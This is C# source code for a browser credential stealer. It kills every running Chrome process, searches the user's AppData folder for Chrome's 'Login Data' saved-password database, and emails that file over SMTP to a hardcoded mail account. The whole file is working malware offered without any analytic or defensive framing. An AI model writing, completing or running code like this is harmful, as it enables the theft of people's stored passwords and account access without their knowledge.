using System.Diagnostics;
using System.Net;
using System.Net.Mail;

class Program
{
    static string _myEmail = "example@gmail.com";
    static string _emailPasssword = "12345";
    static string _name = "anon";
    static string _smtp = "smtp.mail.ru";
    static int _smtpPort = 587;

    static void Main()
    {
        KillChromeProcess();

        string? googleLoginDataPath = FindPathLoginDataGoogle();

        if (googleLoginDataPath != null) SendFileToMail(googleLoginDataPath);
    }
    static void KillChromeProcess()
    {
        Process[] procs = Process.GetProcesses();

        foreach (Process proc in procs)
        {
            if (proc.ProcessName.ToLower() == "chrome")
            {
                proc.Kill();
            }
        }
    }
    static void SendFileToMail(string filePath)
    {
        MailAddress from = new MailAddress(_myEmail, _name);
        MailAddress to = new MailAddress(_myEmail);
        MailMessage m = new MailMessage(from, to);

        m.Attachments.Add(new Attachment(filePath));

        SmtpClient smtp = new SmtpClient(_smtp, _smtpPort)
        {
            Credentials = new NetworkCredential(_myEmail, _emailPasssword),
            EnableSsl = true
        };
        smtp.Send(m);
    }
    static string? FindPathLoginDataGoogle()
    {
        string[] files = Directory.GetFiles(@$"C:\Users\{Environment.UserName}\AppData\", "*",
                new EnumerationOptions
                {
                    IgnoreInaccessible = true,
                    RecurseSubdirectories = true,
                });

        foreach (string file in files)
        {
            string fileName = file.Split(@"\")[^1];
            if (fileName == "Login Data" && file.Split(@"\")[^2] == "Default" && file.Split(@"\")[^3] == "User Data" && file.Split(@"\")[^4] == "Chrome")
            {
                return file;
            } 
        }
        return null;
    }
}
